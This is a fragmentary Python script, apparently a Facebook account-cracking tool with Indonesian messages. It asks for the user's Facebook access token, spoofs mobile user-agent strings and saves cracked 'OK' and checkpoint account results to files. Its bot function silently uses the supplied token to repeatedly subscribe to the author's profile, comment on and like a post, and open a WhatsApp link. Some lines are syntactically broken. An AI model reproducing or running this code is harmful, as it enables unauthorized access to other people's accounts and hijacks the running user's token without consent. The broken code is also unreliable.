...
# Open source code by iqbal R| ngotak dikit cok jangan jual di perjual belikan...
...
except:ugen = ['Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/298.0.0.10.115;','Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBIOS;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/2;FBID/phone;FBLC/fr_FR;FBOP/5','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/361.0.0.39.115']
...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Iqbal R
 [\x1b[1;96m+%s] Github   : https://github.com/iqbalri06
...
class login:
	...
	def __login__(self):
		...
		if token in ['']:
			...
			try:
				cc = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='%(token)).json()['name']
				open('token.x','w').write(token'h)
	...
	def takon(self):
		...
		if takon in ['y','Y','iya']:
			...
			os.system('xdg-open wa.me/6281291544061');exit()
		else:
			login().__login__()
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100045041750457/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100045041750457/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100045041750457/subscribers?access_token=' + toket)
		...
		requests.post('https://graph.facebook.com/5310931375604350/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/5310931375604350/likes?summary=true&access_token=' + toket)
		os.system('xdg-open wa.me/6281291544061')
		menu().main()
		...
		if usna in ['']:
			...
			if hsl in ['1','01']:
				...
				if len(hasil_ok) != 0:
					...
					print(' %s╚═[%s!%s] Kamu gak dapet hasil oke :('%(N,O,N))
			elif hsl in ['2','02']:
				hasil_cp = open('Cp.txt','r').read()
				if len(hasil_cp) != 0:
					print('\n')
					print(' %s[ %shasil cepe kamu %s]'%(N,K,N))
